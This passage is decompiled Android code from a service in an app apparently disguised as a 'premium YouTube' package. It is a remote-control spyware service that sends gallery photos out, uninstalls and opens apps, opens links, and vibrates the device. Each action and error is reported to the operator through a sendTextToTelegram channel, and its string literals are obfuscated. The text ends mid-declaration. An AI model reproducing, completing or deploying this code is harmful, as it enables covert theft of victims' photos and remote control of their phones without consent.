        Job job = this.galleryPhotoJob;
        if (job != null) {
            Job.DefaultImpls.cancel$default(job, (CancellationException) null, 1, (Object) null);
        }
        this.galleryPhotoSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵Boolean$arg0$call$setgalleryPhotoSending$$funstartGalleryPhotoSending$classUploadService();
        this.galleryPhotoJob = BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۲1(null), 3, (Object) null);
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1", f = "UploadService.kt", i = {0, 0, 1, 1}, l = {2365, 2366}, m = "invokeSuspend", n = {"$this$launch", "it", "$this$launch", "it"}, s = {"L$0", "L$3", "L$0", "L$3"})
    static final class C۰۰۵۲1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        private /* synthetic */ Object L$0;
        Object L$1;
        Object L$2;
        Object L$3;
        int label;

        C۰۰۵۲1(Continuation<? super C۰۰۵۲1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            Continuation<Unit> continuation2 = UploadService.this.new C۰۰۵۲1(continuation);
            continuation2.L$0 = obj;
            return continuation2;
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Multi-variable type inference failed */
        /* JADX WARN: Type inference failed for: r3v0, types: [int] */
        /* JADX WARN: Type inference failed for: r3v1 */
        /* JADX WARN: Type inference failed for: r3v11 */
        /* JADX WARN: Type inference failed for: r3v12 */
        /* JADX WARN: Type inference failed for: r3v13 */
        /* JADX WARN: Type inference failed for: r3v14 */
        /* JADX WARN: Type inference failed for: r3v15 */
        /* JADX WARN: Type inference failed for: r3v16 */
        /* JADX WARN: Type inference failed for: r3v17 */
        /* JADX WARN: Type inference failed for: r3v18 */
        /* JADX WARN: Type inference failed for: r3v2 */
        /* JADX WARN: Type inference failed for: r3v3, types: [com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1] */
        /* JADX WARN: Type inference failed for: r3v6, types: [com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1] */
        /* JADX WARN: Type inference failed for: r3v7, types: [com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1, kotlin.coroutines.Continuation] */
        /* JADX WARN: Type inference failed for: r3v8, types: [com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1, kotlin.coroutines.Continuation] */
        /* JADX WARN: Type inference failed for: r3v9 */
        /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:34:0x0102 -> B:35:0x0108). Please report as a decompilation issue!!! */
        /*  JADX ERROR: JadxRuntimeException in pass: RegionMakerVisitor
            jadx.core.utils.exceptions.JadxRuntimeException: Not found exit edge by exit block: B:20:0x00ac
            	at ib.a.f(Unknown Source:2)
            	at jadx.core.dex.visitors.regions.maker.LoopRegionMaker.checkLoopExits(Unknown Source:96)
            	at jadx.core.dex.visitors.regions.maker.LoopRegionMaker.makeLoopRegion(Unknown Source:171)
            	at jadx.core.dex.visitors.regions.maker.LoopRegionMaker.process(Unknown Source:61)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:44)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
            	at jadx.core.dex.visitors.regions.maker.IfRegionMaker.process(Unknown Source:137)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:147)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
            	at jadx.core.dex.visitors.regions.maker.IfRegionMaker.process(Unknown Source:137)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:147)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
            	at jadx.core.dex.visitors.regions.maker.IfRegionMaker.process(Unknown Source:137)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:147)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
            	at jadx.core.dex.visitors.regions.maker.LoopRegionMaker.process(Unknown Source:316)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:44)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
            	at jadx.core.dex.visitors.regions.maker.IfRegionMaker.process(Unknown Source:115)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:147)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
            	at jadx.core.dex.visitors.regions.maker.SwitchRegionMaker.addCases(Unknown Source:159)
            	at jadx.core.dex.visitors.regions.maker.SwitchRegionMaker.process(Unknown Source:94)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:136)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
            	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeMthRegion(Unknown Source:6)
            	at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(Unknown Source:22)
            */
        public final java.lang.Object invokeSuspend(java.lang.Object r21) {
            /*
                Method dump skipped, instruction units count: 336
                To view this dump add '--comments-level debug' option
            */
            throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۲1.invokeSuspend(java.lang.Object):java.lang.Object");
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1$2, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1$2", f = "UploadService.kt", i = {}, l = {2370}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass2(UploadService uploadService, Continuation<? super AnonymousClass2> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass2(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$try$fun$anonymous$$arg2$calllaunch$arg0$call$setgalleryPhotoJob$$funstartGalleryPhotoSending$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1$3, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startGalleryPhotoSending$1$3", f = "UploadService.kt", i = {}, l = {2372}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass3 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ Exception $e;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass3(UploadService uploadService, Exception exc, Continuation<? super AnonymousClass3> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$e = exc;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass3(this.this$0, this.$e, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۴String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$fun$anonymous$$arg2$calllaunch$arg0$call$setgalleryPhotoJob$$funstartGalleryPhotoSending$classUploadService() + this.$e.getMessage(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }
    }

    private final void stopGalleryPhotoSending() {
        this.galleryPhotoSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶Boolean$arg0$call$setgalleryPhotoSending$$funstopGalleryPhotoSending$classUploadService();
        Job job = this.galleryPhotoJob;
        if (job != null) {
            Job.DefaultImpls.cancel$default(job, (CancellationException) null, 1, (Object) null);
        }
        this.galleryPhotoJob = null;
    }

    private final void uninstallAppByPackage(String pkg) {
        try {
            bringMainActivityToFront();
            Intent intent = new Intent(LiveLiterals$UploadServiceKt.INSTANCE.m۷۵۰String$arg0$call$init$$valintent$try$fununinstallAppByPackage$classUploadService());
            intent.putExtra(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۹String$arg0$callputExtra$try$fununinstallAppByPackage$classUploadService(), pkg);
            sendBroadcast(intent);
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۶۱1(pkg, null), 3, (Object) null);
        } catch (Exception e) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۶۲2(pkg, e, null), 3, (Object) null);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$uninstallAppByPackage$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$uninstallAppByPackage$1", f = "UploadService.kt", i = {}, l = {2389}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۶۱1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $pkg;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۶۱1(String str, Continuation<? super C۰۰۶۱1> continuation) {
            super(2, continuation);
            this.$pkg = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۶۱1(this.$pkg, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۷String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$try$fununinstallAppByPackage$classUploadService() + this.$pkg + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۲String$2$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$try$fununinstallAppByPackage$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$uninstallAppByPackage$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$uninstallAppByPackage$2", f = "UploadService.kt", i = {}, l = {2391}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۶۲2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ Exception $e;
        final /* synthetic */ String $pkg;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۶۲2(String str, Exception exc, Continuation<? super C۰۰۶۲2> continuation) {
            super(2, continuation);
            this.$pkg = str;
            this.$e = exc;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۶۲2(this.$pkg, this.$e, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۰String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$fununinstallAppByPackage$classUploadService() + this.$pkg + LiveLiterals$UploadServiceKt.INSTANCE.m۶۵۸String$2$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$fununinstallAppByPackage$classUploadService() + this.$e.getMessage(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendLiveReadingStatus$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendLiveReadingStatus$1", f = "UploadService.kt", i = {}, l = {2397}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۳۴1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $msg;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۳۴1(String str, Continuation<? super C۰۰۳۴1> continuation) {
            super(2, continuation);
            this.$msg = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۳۴1(this.$msg, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(this.$msg, (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    private final void sendLiveReadingStatus(boolean enabled) {
        LiveLiterals$UploadServiceKt liveLiterals$UploadServiceKt = LiveLiterals$UploadServiceKt.INSTANCE;
        String msg = enabled ? liveLiterals$UploadServiceKt.m۱۳۶۱String$branch$if$valmsg$funsendLiveReadingStatus$classUploadService() : liveLiterals$UploadServiceKt.m۱۴۰۶String$else$if$valmsg$funsendLiveReadingStatus$classUploadService();
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۳۴1(msg, null), 3, (Object) null);
    }

    private final void bringMainActivityToFront() {
        try {
            Intent intent = new Intent(this, (Class<?>) MainActivity.class);
            intent.addFlags(872415232);
            startActivity(intent);
        } catch (Exception e) {
        }
    }

    private final boolean hasVibratePermission() {
        return ContextCompat.checkSelfPermission(this, "android.permission.VIBRATE") == 0;
    }

    private final void vibrateDevice(long durationMs) {
        if (!hasVibratePermission()) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۲۷String$arg0$calle$branch$if$funvibrateDevice$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۰۷String$arg1$calle$branch$if$funvibrateDevice$classUploadService());
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۶۴1(null), 3, (Object) null);
            return;
        }
        try {
            Object systemService = getSystemService("vibrator");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.os.Vibrator");
            Vibrator vibrator = (Vibrator) systemService;
            if (Build.VERSION.SDK_INT >= 26) {
                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, RangesKt.coerceAtLeast(-1, LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۹Int$arg0$callcoerceAtLeast$arg1$callcreateOneShot$arg0$callvibrate$branch$if$try$funvibrateDevice$classUploadService())));
            } else {
                vibrator.vibrate(durationMs);
            }
            this.isVibrating = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۰Boolean$arg0$call$setisVibrating$$try$funvibrateDevice$classUploadService();
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۶۳String$arg0$calle$catch$funvibrateDevice$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۸۰String$0$str$arg1$calle$catch$funvibrateDevice$classUploadService() + e.getMessage());
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۶۵2(e, null), 3, (Object) null);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$vibrateDevice$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$vibrateDevice$1", f = "UploadService.kt", i = {}, l = {2415}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۶۴1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۶۴1(Continuation<? super C۰۰۶۴1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۶۴1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch$if$funvibrateDevice$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$vibrateDevice$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$vibrateDevice$2", f = "UploadService.kt", i = {}, l = {2430}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۶۵2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ Exception $e;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۶۵2(Exception exc, Continuation<? super C۰۰۶۵2> continuation) {
            super(2, continuation);
            this.$e = exc;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۶۵2(this.$e, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۱String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$funvibrateDevice$classUploadService() + this.$e.getMessage(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    private final void stopVibration() {
        try {
            Object systemService = getSystemService("vibrator");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.os.Vibrator");
            Vibrator vibrator = (Vibrator) systemService;
            vibrator.cancel();
            this.isVibrating = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۹Boolean$arg0$call$setisVibrating$$try$funstopVibration$classUploadService();
        } catch (Exception e) {
        }
    }

    private final void sendToastToMainActivity(String message) {
        bringMainActivityToFront();
        Intent intent = new Intent(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۹String$arg0$call$init$$valintent$funsendToastToMainActivity$classUploadService());
        intent.putExtra(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۸String$arg0$callputExtra$funsendToastToMainActivity$classUploadService(), message);
        sendBroadcast(intent);
    }

    private final void sendLinkOpenToMainActivity(String url) {
        bringMainActivityToFront();
        String fixedUrl = StringsKt.trim(url).toString();
        if (!StringsKt.startsWith$default(fixedUrl, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۱String$arg0$callstartsWith$$this$callnot$cond$cond$if$funsendLinkOpenToMainActivity$classUploadService(), false, 2, (Object) null) && !StringsKt.startsWith$default(fixedUrl, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۷String$arg0$callstartsWith$$this$callnot$branch$cond$if$funsendLinkOpenToMainActivity$classUploadService(), false, 2, (Object) null)) {
            fixedUrl = LiveLiterals$UploadServiceKt.INSTANCE.m۵۸۸String$0$str$setfixedUrl$branch$if$funsendLinkOpenToMainActivity$classUploadService() + fixedUrl;
        }
        Intent intent = new Intent(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۶String$arg0$call$init$$valintent$funsendLinkOpenToMainActivity$classUploadService());
        intent.putExtra(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۵String$arg0$callputExtra$funsendLinkOpenToMainActivity$classUploadService(), fixedUrl);
        sendBroadcast(intent);
    }

    private final void openAppByName(String appName) {
        Object element$iv;
        try {
            PackageManager pm = getPackageManager();
            Iterable installedApplications = pm.getInstalledApplications(128);
            Intrinsics.checkNotNullExpressionValue(installedApplications, "pm.getInstalledApplicati…ageManager.GET_META_DATA)");
            Iterable $this$firstOrNull$iv = installedApplications;
            Iterator it = $this$firstOrNull$iv.iterator();
            while (true) {
                if (it.hasNext()) {
                    element$iv = it.next();
                    ApplicationInfo it2 = (ApplicationInfo) element$iv;
                    if (StringsKt.equals(pm.getApplicationLabel(it2).toString(), appName, LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۷Boolean$arg1$callequals$fun$anonymous$$arg0$callfirstOrNull$valmatch$try$funopenAppByName$classUploadService())) {
                        break;
                    }
                } else {
                    element$iv = null;
                    break;
                }
            }
            ApplicationInfo match = (ApplicationInfo) element$iv;
            if (match == null) {
                BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۰۸1(appName, null), 3, (Object) null);
                return;
            }
            String str = match.packageName;
            Intrinsics.checkNotNullExpressionValue(str, "match.packageName");
            openAppByPackage(str);
        } catch (Exception e) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۰۹2(appName, e, null), 3, (Object) null);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$openAppByName$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$openAppByName$1", f = "UploadService.kt", i = {}, l = {2468}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۰۸1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $appName;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۰۸1(String str, Continuation<? super C۰۰۰۸1> continuation) {
            super(2, continuation);
            this.$appName = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۰۸1(this.$appName, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۲String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$try$funopenAppByName$classUploadService() + this.$appName, (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$openAppByName$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$openAppByName$2", f = "UploadService.kt", i = {}, l = {2471}, m = "invokeSuspend", n = {}, s = {})
